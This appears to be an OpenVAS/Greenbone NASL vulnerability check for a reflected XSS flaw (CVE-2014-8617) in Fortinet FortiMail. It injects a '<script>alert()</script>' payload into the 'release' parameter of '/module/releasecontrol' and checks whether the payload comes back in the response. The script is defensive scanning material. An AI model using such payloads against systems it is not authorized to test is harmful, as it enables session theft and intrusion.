# Copyright (C) 2015 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:fortinet:fortimail";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105239");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_version("2022-04-14T06:42:08+0000");
  script_cve_id("CVE-2014-8617");

  script_name("Fortinet FortiMail Web Action Quarantine Release Feature XSS Vulnerability (FG-IR-15-005)");

  script_xref(name:"URL", value:"https://www.fortiguard.com/psirt/FG-IR-15-005");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/72820");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"insight", value:"The application does not validate the parameter 'release' in
  '/module/releasecontrol?release='.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"Fortinet FortiMail is prone to a XSS vulnerability
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"affected", value:"FortiMail version 5.2.1.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"last_modification", value:"2022-04-14 06:42:08 +0000 (Thu, 14 Apr 2022)");
  script_tag(name:"creation_date", value:"2015-03-18 13:18:03 +0100 (Wed, 18 Mar 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_fortimail_consolidation.nasl");
  script_mandatory_keys("fortinet/fortimail/detected");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vt_strings = get_vt_strings();

url = dir + '/module/releasecontrol?release=1:aaa:aaaaaaa<script>alert(/' + vt_strings["default"] + '/)</script>';

if( http_vuln_check( port:port, url:url, pattern:"<script>alert\(/" + vt_strings["default"] + "/\)</script>", check_header:TRUE ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
